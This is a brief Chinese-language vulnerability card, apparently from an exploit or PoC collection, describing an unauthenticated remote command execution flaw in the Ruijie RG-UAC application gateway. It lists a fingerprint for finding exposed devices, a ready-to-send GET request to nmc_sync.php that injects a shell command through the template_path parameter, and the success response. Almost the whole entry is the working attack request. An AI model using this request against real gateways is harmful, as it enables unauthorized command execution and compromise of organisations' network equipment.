# 锐捷RG-UAC应用网关前台RCE漏洞

锐捷 ｜ 命令执行 ｜ —
- **指纹**：`app="Ruijie-RG-UAC"`
- **请求**：`GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=whoami%20>dudesuite.txtcat HTTP/1.1`
- **响应特征**：200 OK